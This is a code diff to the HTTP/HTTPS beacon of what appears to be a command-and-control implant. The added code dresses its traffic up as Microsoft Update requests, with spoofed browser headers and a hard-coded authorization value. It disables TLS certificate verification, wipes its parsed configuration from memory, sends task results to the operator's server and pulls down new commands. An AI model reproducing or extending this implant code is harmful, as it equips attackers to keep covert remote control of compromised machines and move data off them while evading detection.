@@ -1,5 +1,6 @@
 #include "BeaconHttp.hpp"
 
+#include <random>
 
 #ifdef __linux__
 
@@ -17,63 +18,100 @@
 using namespace std;
 
 
-json BeaconHttpConfig = {
-	{"http-post", {
-		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
-		{"client", {
-			{"headers", {
-                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
-                {"Content-Type","text/plain;charset=UTF-8"},
-                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
-				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
-                {"Keep-Alive", "timeout=5, max=1000"},
-                {"Connection","Keep-Alive"},
-                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
-                {"Accept","*/*"},
-                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
-                {"Sec-Ch-Ua-Platform","Windows"}
-            }}
-		}},
-		{"server", {
-			{"headers", {
-                {"Access-Control-Allow-Origin", "true"},
-                {"Connection","Keep-Alive"},
-                {"Content-Type","application/json"},
-                {"Server","Server"},
-                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
-                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
-            }}
-		}}
-  	}},
-	{"https-post", {
-		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
-		{"client", {
-			{"headers", {
-                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
-                {"Content-Type","text/plain;charset=UTF-8"},
-                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
-				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
-                {"Keep-Alive", "timeout=5, max=1000"},
-                {"Connection","Keep-Alive"},
-                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
-                {"Accept","*/*"},
-                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
-                {"Sec-Ch-Ua-Platform","Windows"}
-            }}
-		}},
-		{"server", {
-			{"headers", {
-                {"Access-Control-Allow-Origin", "true"},
-                {"Connection","Keep-Alive"},
-                {"Content-Type","application/json"},
-                {"Server","Server"},
-                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
-                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
-            }}
-		}}
-  	}}
-};
-
+// TODO encypte with a beacon key
+std::string _BeaconHttpConfig_ = R"({
+    "xorKey": "dfsdgferhzdzxczevre5595485sdg",
+    "ListenerHttpConfig": [
+        {
+            "uri": [
+                "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
+                "/MicrosoftUpdate/ShellEx/KB242742/admin.aspx",
+                "/MicrosoftUpdate/ShellEx/KB242742/download.aspx"
+            ],
+            "client": [
+                {
+                    "headers": [
+                        {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+                        },
+                        {
+                            "Connection": "Keep-Alive"
+                        },
+                        {
+                            "Content-Type": "text/plain;charset=UTF-8"
+                        },
+                        {
+                            "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
+                        },
+                        {
+                            "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="
+                        },
+                        {
+                            "Keep-Alive": "timeout=5, max=1000"
+                        },
+                        {
+                            "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"
+                        },
+                        {
+                            "Accept": "*/*"
+                        },
+                        {
+                            "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""
+                        },
+                        {
+                            "Sec-Ch-Ua-Platform": "Windows"
+                        }
+                    ]
+                }
+            ]
+        }
+    ],
+    "ListenerHttpsConfig": [
+        {
+            "uri": [
+                "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
+                "/MicrosoftUpdate/ShellEx/KB242742/upload.aspx",
+                "/MicrosoftUpdate/ShellEx/KB242742/config.aspx"
+            ],
+            "client": [
+                {
+                    "headers": [
+                        {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+                        },
+                        {
+                            "Connection": "Keep-Alive"
+                        },
+                        {
+                            "Content-Type": "text/plain;charset=UTF-8"
+                        },
+                        {
+                            "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
+                        },
+                        {
+                            "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="
+                        },
+                        {
+                            "Keep-Alive": "timeout=5, max=1000"
+                        },
+                        {
+                            "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"
+                        },
+                        {
+                            "Accept": "*/*"
+                        },
+                        {
+                            "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""
+                        },
+                        {
+                            "Sec-Ch-Ua-Platform": "Windows"
+                        }
+                    ]
+                }
+            ]
+        }
+    ]
+})";
 
 
 #ifdef __linux__
@@ -93,7 +131,7 @@ std::wstring getUtf16(const std::string& str, int codepage)
 }
 
 
-string HttpsWebRequestPost(const string& domain, int port, const string& url, const string& data, bool isHttps)
+string HttpsWebRequestPost(const string& domain, int port, const string& url, const string& data, const nlohmann::json& httpHeaders, bool isHttps)
 {
     wstring sdomain = getUtf16(domain, CP_UTF8);
     wstring surl = getUtf16(url, CP_UTF8);
@@ -122,10 +160,6 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
     // Add a request header.
     if( hRequest )
     {
-        json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
-        if(isHttps)
-            httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
-
         for (auto& it : httpHeaders.items())
         {
             std::string newHeader = (it).key();
@@ -245,6 +279,16 @@ BeaconHttp::BeaconHttp(std::string& ip, int port, bool isHttps)
     , m_isHttps(isHttps)
 {
     srand(time(NULL));
+
+    m_beaconHttpConfig = nlohmann::json::parse(_BeaconHttpConfig_);
+
+    const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    std::random_device rd;
+    std::mt19937 generator(rd());
+    std::uniform_int_distribution<int> distribution(0, charset.size() - 1);
+
+    for(int i=0; i<_BeaconHttpConfig_.size(); i++)
+        _BeaconHttpConfig_[i]=charset[distribution(generator)];
 }
 
 
@@ -258,37 +302,60 @@ void BeaconHttp::checkIn()
     
 #ifdef __linux__
 
-    httplib::Client cli(m_ip, m_port);
-
     if(m_isHttps)
+    {
+        httplib::SSLClient cli(m_ip, m_port);
         cli.enable_server_certificate_verification(false);
 
-    std::string output;
-    taskResultsToCmd(output);
+        std::string output;
+        taskResultsToCmd(output);
 
-    json httpUri = BeaconHttpConfig["http-post"]["uri"];
-    if(m_isHttps)
-        httpsUri = BeaconHttpConfig["https-post"]["uri"];
+        nlohmann::json httpsUri = m_beaconHttpConfig["ListenerHttpsConfig"][0]["uri"];
+        std::string endPoint = httpsUri[ rand() % httpsUri.size() ];
 
-    std::string endPoint = httpUri[ rand() % httpUri.size() ];
+        nlohmann::json httpHeaders = m_beaconHttpConfig["ListenerHttpsConfig"][0]["client"][0]["headers"][0];
 
-    json httpHeaders = BeaconHttpConfig["http-post"]["client"]["headers"];
-    if(m_isHttps)
-        httpHeaders = BeaconHttpConfig["https-post"]["client"]["headers"];
+        httplib::Headers httpClientHeaders;
+        for (auto& it : httpHeaders.items())
+            httpClientHeaders.insert({(it).key(), (it).value()});
 
-    httplib::Headers httpClientHeaders;
-    for (auto& it : httpHeaders.items())
-        httpClientHeaders.insert({(it).key(), (it).value()});
-    res.headers = httpClientHeaders;
-
-    if (auto res = cli.Post(endPoint, httpClientHeaders, output))
-    {
-        if (res->status == 200) 
+        if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
         {
-            std::string input = res->body;
-            if(!input.empty())
+            if (res->status == 200) 
             {
-                cmdToTasks(input);
+                std::string input = res->body;
+                if(!input.empty())
+                {
+                    cmdToTasks(input);
+                }
+            }
+        }
+    }
+    else
+    {
+        httplib::Client cli(m_ip, m_port);
+
+        std::string output;
+        taskResultsToCmd(output);
+
+        nlohmann::json httpUri = m_beaconHttpConfig["ListenerHttpConfig"][0]["uri"];
+        std::string endPoint = httpUri[ rand() % httpUri.size() ];
+
+        nlohmann::json httpHeaders = m_beaconHttpConfig["ListenerHttpConfig"][0]["client"][0]["headers"][0];
+
+        httplib::Headers httpClientHeaders;
+        for (auto& it : httpHeaders.items())
+            httpClientHeaders.insert({(it).key(), (it).value()});
+
+        if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
+        {
+            if (res->status == 200) 
+            {
+                std::string input = res->body;
+                if(!input.empty())
+                {
+                    cmdToTasks(input);
+                }
             }
         }
     }
@@ -300,19 +367,25 @@ void BeaconHttp::checkIn()
 
     if(m_isHttps)
     {
-        auto httpsUri = BeaconHttpConfig["https-post"]["uri"];
+        auto httpsUri = m_beaconHttpConfig["ListenerHttpsConfig"][0]["uri"];
         endPoint = httpsUri[ rand() % httpsUri.size() ];
     }
     else
     {
-        auto httpUri = BeaconHttpConfig["http-post"]["uri"];
+        auto httpUri = m_beaconHttpConfig["ListenerHttpConfig"][0]["uri"];
         endPoint = httpUri[ rand() % httpUri.size() ];
     }
 
 	std::string output;
 	taskResultsToCmd(output);
 
-    std::string input = HttpsWebRequestPost(m_ip, m_port, endPoint, output, m_isHttps);
+    nlohmann::json httpHeaders;
+    if(!m_isHttps)
+        httpHeaders = m_beaconHttpConfig["ListenerHttpConfig"][0]["client"][0]["headers"][0];
+    else 
+        httpHeaders = m_beaconHttpConfig["ListenerHttpsConfig"][0]["client"][0]["headers"][0];
+
+    std::string input = HttpsWebRequestPost(m_ip, m_port, endPoint, output, httpHeaders, m_isHttps);
 
     if (!input.empty())
     {
